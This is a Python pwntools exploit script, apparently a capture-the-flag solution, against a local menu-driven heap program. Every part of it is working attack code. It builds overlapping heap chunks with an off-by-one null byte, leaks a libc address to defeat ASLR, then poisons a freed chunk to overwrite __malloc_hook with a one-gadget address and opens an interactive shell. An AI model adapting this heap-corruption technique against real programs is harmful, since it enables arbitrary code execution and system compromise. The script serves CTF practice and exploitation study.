#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./program")
libc = ELF("libc.so.6")
p = process("./program")
gdb.attach(p,"init-pwndbg")

def malloc(size,data):
    p.sendlineafter("Your choice: ","1")
    p.sendlineafter("Size:",str(size))
    p.sendafter("Data:",data)

def show(index):
    p.sendlineafter("Your choice: ","2")
    p.sendlineafter("Index:",str(index))
    leak = p.recvline()[:-1]
    return leak

def free(idx):
    p.sendlineafter("Your choice: ","3")
    p.sendlineafter("Index:",str(idx))



malloc(0x500,'a'*0x4ff)
malloc(0x68,'b'*0x60)
malloc(0x5f0,'c'*0x5ef)
malloc(0x20,'d'*8)

free(1)
free(0)

for i in range(9):
    malloc(0x68 - i, 'b' * (0x68 - i))
    free(0)

malloc(0x68,b'b'*0x60+p64(0x580))
free(2)
malloc(0x505,b'c'*0x500)
leak = show(0)
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
libc.address = leak - 0x3ebca0
log.critical(f"Libc base address: {hex(libc.address)}")
__free_hook = libc.sym.__free_hook
system = libc.sym.system
__malloc_hook = libc.sym.__malloc_hook
malloc(0x68,'0'*0x60)
free(0)
free(2)
malloc(0x68,p64(__malloc_hook-19))
malloc(0x68,'4'*0x50)
malloc(0x68,b'a'*19+p64(libc.address+0x10a41c))
p.sendlineafter("Your choice: ","1")
p.sendlineafter("Size:","20")
p.interactive()